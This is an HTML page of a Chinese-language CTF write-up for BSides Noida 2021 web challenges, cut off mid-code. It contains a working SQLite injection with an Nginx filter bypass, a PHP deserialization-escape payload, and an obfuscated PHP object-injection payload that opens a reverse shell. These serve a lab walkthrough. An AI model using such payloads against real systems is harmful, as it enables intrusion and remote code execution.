@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang=zh-TW>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="WebBaby Web Just a place to see list of all challs from bsides noida CTF, maybe some flag too xDNote : Bruteforce is not required.  題目給出的是一個 SQLite 注入點，但是 Nginx 禁用了所有字母。根據給出的附件可知根目錄下有 karma.db，訪問到 &#x2F;ka">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BSides Noida CTF 2021">
+<meta property="og:url" content="https://lemonprefect.cn/zh-TW/posts/6b16e944.html">
+<meta property="og:site_name" content="Hexagon">
+<meta property="og:description" content="WebBaby Web Just a place to see list of all challs from bsides noida CTF, maybe some flag too xDNote : Bruteforce is not required.  題目給出的是一個 SQLite 注入點，但是 Nginx 禁用了所有字母。根據給出的附件可知根目錄下有 karma.db，訪問到 &#x2F;ka">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/824f1fae-1c61-4acb-8561-3e2bcd829477/1628492691729899/778de3c107ceaff1a2882396a0f81a783dd28c4c.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/824f1fae-1c61-4acb-8561-3e2bcd829477/1628504234060552/f5027eccc0e5926c867ad5cce52e6d632ebc7b34.jpg">
+<meta property="article:published_time" content="2021-08-09T07:00:00.000Z">
+<meta property="article:modified_time" content="2021-08-15T13:24:26.435Z">
+<meta property="article:author" content="LemonPrefect">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://api.lemonprefect.cn/image/hdslb/archive/824f1fae-1c61-4acb-8561-3e2bcd829477/1628492691729899/778de3c107ceaff1a2882396a0f81a783dd28c4c.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/avatar.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>BSides Noida CTF 2021</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexagon" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Hexagon" type="application/rss+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/zh-TW/">首頁</a></li>
+         
+          <li><a href="/zh-TW/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        <!-- 
+        <li><a class="icon" aria-label="上一篇 " href="/zh-CN/posts/6b16e944.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/zh-CN/posts/7b00520f.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        --!>
+
+        
+          
+          
+          
+            <li><a class="icon" aria-label="中文简体（大陆标准） " href="/zh-CN/posts/6b16e944.html">简</a></li>
+          
+            <li><a class="icon" aria-label="正体中文（台灣標準） " href="#">正</a></li>
+          
+        
+
+        <li><a class="icon" aria-label="回到頁首 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true"></i></a></li>
+        <li><a class="icon" aria-label="分享 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">回到頁首</span>
+      <span id="i-share" class="info" style="display:none;">分享</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/6b16e944.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/6b16e944.html&text=BSides Noida CTF 2021"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/6b16e944.html&title=BSides Noida CTF 2021"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/6b16e944.html&is_video=false&description=BSides Noida CTF 2021"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BSides Noida CTF 2021&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/6b16e944.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/6b16e944.html&title=BSides Noida CTF 2021"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/6b16e944.html&title=BSides Noida CTF 2021"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/6b16e944.html&title=BSides Noida CTF 2021"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/6b16e944.html&title=BSides Noida CTF 2021"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/6b16e944.html&name=BSides Noida CTF 2021&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/6b16e944.html&t=BSides Noida CTF 2021"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Baby-Web"><span class="toc-number">1.1.</span> <span class="toc-text">Baby Web</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Baby-Web-Revenge"><span class="toc-number">1.2.</span> <span class="toc-text">Baby Web Revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wowooo"><span class="toc-number">1.3.</span> <span class="toc-text">wowooo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#freepoint"><span class="toc-number">1.4.</span> <span class="toc-text">freepoint</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Calculate"><span class="toc-number">1.5.</span> <span class="toc-text">Calculate</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Farewell"><span class="toc-number">2.1.</span> <span class="toc-text">Farewell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Psst"><span class="toc-number">2.2.</span> <span class="toc-text">Psst</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#My-Artwork"><span class="toc-number">2.3.</span> <span class="toc-text">My Artwork</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        BSides Noida CTF 2021
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">LemonPrefect</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-08-09T07:00:00.000Z" itemprop="datePublished">2021-08-09</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Baby-Web"><a href="#Baby-Web" class="headerlink" title="Baby Web"></a>Baby Web</h3><blockquote>
+<p>Just a place to see list of all challs from bsides noida CTF, maybe some flag too xD<br>Note : Bruteforce is not required.</p>
+</blockquote>
+<p>題目給出的是一個 SQLite 注入點，但是 Nginx 禁用了所有字母。根據給出的附件可知根目錄下有 <code>karma.db</code>，訪問到 <code>/karma.db</code> 將其下載下來。使用 SQLite Expert 讀取即可得到 flag。</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/824f1fae-1c61-4acb-8561-3e2bcd829477/1628492691729899/778de3c107ceaff1a2882396a0f81a783dd28c4c.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BSNoida&#123;4_v3ry_w4rm_w31c0m3_2_bs1d35_n01d4&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Baby-Web-Revenge"><a href="#Baby-Web-Revenge" class="headerlink" title="Baby Web Revenge"></a>Baby Web Revenge</h3><blockquote>
+<p>So close yet so far</p>
+</blockquote>
+<p>再來審視一下 Nginx 的過濾。</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($arg_chall_id ~ [A-Za-z_.%])&#123;</span><br><span class="line">	<span class="attribute">return</span> <span class="number">500</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>這裡其實只看了引數 chall_id，但是因為後端是 PHP，所以 chall.id 實際上也會被 PHP 解析成 chall_id。但是到 Nginx 時卻不會被這麼處理，因此得以繞過 Nginx 的過濾。結合後端是 SQLite，使用如下載荷即可讀取資訊。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chall.id&#x3D;1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(sql),2,3,4,5,6&#x2F;**&#x2F;from&#x2F;**&#x2F;sqlite_master</span><br></pre></td></tr></table></figure>
+
+<p>得到如下表結構，進而嘗試讀取 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE CTF(</span><br><span class="line">    id INteger AUTO_INCREMENT,</span><br><span class="line">    title varchar(255) not NULL,</span><br><span class="line">    description varchar(255) not NULL,</span><br><span class="line">    category varchar(255) not NULL,</span><br><span class="line">    author varchar(255) not NULL,</span><br><span class="line">    points int NOT NULL),</span><br><span class="line">CREATE TABLE therealflags(</span><br><span class="line">    id int AUTO_INCREMENT,</span><br><span class="line">    flag varchar(255) not NULL)</span><br></pre></td></tr></table></figure>
+
+<p>構造出如下載荷讀取 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chall.id&#x3D;1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;flag,2,3,4,5,6&#x2F;**&#x2F;from&#x2F;**&#x2F;therealflags</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BSNoida&#123;4_v3ry_w4rm_w31c0m3_2_bs1d35_n01d4_fr0m_4n_1nt3nd3d_s01ut10nxD&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="wowooo"><a href="#wowooo" class="headerlink" title="wowooo"></a>wowooo</h3><blockquote>
+<p>it’s really interesting<br>Note : Bruteforce is not required.</p>
+</blockquote>
+<p>根據頁面原始碼註釋的提示提交 GET 引數 <code>debug</code> 即可得到如下程式碼。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">function filter($string)&#123;</span><br><span class="line">    $filter &#x3D; &#39;&#x2F;flag&#x2F;i&#39;;</span><br><span class="line">    return preg_replace($filter,&#39;flagcc&#39;,$string);</span><br><span class="line">&#125;</span><br><span class="line">$username&#x3D;$_GET[&#39;name&#39;];</span><br><span class="line">$pass&#x3D;&quot;V13tN4m_number_one&quot;;</span><br><span class="line">$pass&#x3D;&quot;Fl4g_in_V13tN4m&quot;;</span><br><span class="line">$ser&#x3D;&#39;a:2:&#123;i:0;s:&#39;.strlen($username).&quot;:\&quot;$username\&quot;;i:1;s:&quot;.strlen($pass).&quot;:\&quot;$pass\&quot;;&#125;&quot;;</span><br><span class="line"></span><br><span class="line">$authen &#x3D; unserialize(filter($ser));</span><br><span class="line"></span><br><span class="line">if($authen[1]&#x3D;&#x3D;&#x3D;&quot;V13tN4m_number_one &quot;)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">if (!isset($_GET[&#39;debug&#39;])) &#123;</span><br><span class="line">    echo(&quot;PLSSS DONT HACK ME!!!!!!&quot;).PHP_EOL;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file( __FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!-- debug --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>很明顯是少變多的反序列化逃逸，逃逸點在變數 username 處由四個字元變為六個字元。先構造出要逃逸達成的部分。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;i:1;s:19:&quot;V13tN4m_number_one &quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一共 34 個字元，因此此時需要替換 17 次才能完成逃逸，構造出如下載荷。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;i:1;s:19:&quot;V13tN4m_number_one &quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以 GET 引數 name 發起請求即可得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BSNoida&#123;3z_ch4all_46481684185_!!!!!!@!&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="freepoint"><a href="#freepoint" class="headerlink" title="freepoint"></a>freepoint</h3><blockquote>
+<p>i hate php &gt;.&lt;<br>Note : Bruteforce is not required.</p>
+</blockquote>
+<p>題目給出的程式碼如下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/system|exec|passthru|shell_exec|pcntl_exec|bin2hex|popen|scandir|hex2bin|[~$.^_`]|\&#x27;[a-z]|\&quot;[a-z0-9]/i&quot;</span>,<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BSides</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$option</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$note</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$option</span> = <span class="string">&quot;no flag&quot;</span>;</span><br><span class="line">        <span class="variable">$name</span> = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">        <span class="variable">$note</span> = <span class="string">&quot;flag&#123;flag_phake&#125;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;load();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;option === <span class="string">&quot;no flag&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;flag here ! :)&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;option === <span class="string">&quot;getFlag&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;loadFlag();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You don&#x27;t need flag ?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">loadFlag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;note) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;name)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;name === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (filter(<span class="keyword">$this</span>-&gt;note) == <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;note.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;18cm30p !! :&lt; &quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;load();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctf</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (check(<span class="variable">$ctf</span>)) &#123;</span><br><span class="line">        unserialize(<span class="variable">$ctf</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以發現只需要控制 option 為 getFlag，name 為 admin 即可進入到 note 的執行。由於這裡進行了諸多限制，考慮使用十六進位制和字串反向繞過。構造出如下 payload 來讀取 PHPINFO。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;BSides&quot;:3:&#123;s:6:&quot;option&quot;;s:7:&quot;getFlag&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:4:&quot;note&quot;;s:27:&quot;eval(strrev(&quot;;)(ofniphp&quot;));&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以發現在 disable_function 處沒有禁用任何函式，因此直接一把梭反彈 shell。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;BSides&quot;:3:&#123;s:6:&quot;option&quot;;s:7:&quot;getFlag&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:4:&quot;note&quot;;s:139:&quot;eval(strrev(&quot;;))&#39;221362e3030253532333f2031323e283e2633313e283f2073647f2675646f20262e30296d20286371626220236d20286371626&#39;(nib2xeh(metsys&quot;));&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>反彈 shell 在 /home 下讀到 fl4g_ne_xxx.txt 即為 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BSNoida&#123;Fre3_fl4g_f04_y0u_@@55361988!!!&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Calculate"><a href="#Calculate" class="headerlink" title="Calculate"></a>Calculate</h3><blockquote>
+<p>Are you a math prodigy? hehe</p>
+</blockquote>
+<p>根據頁面原始碼中的提示加上 🐶 為 key 的 GET 引數即可得到相對完整的原始碼。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span 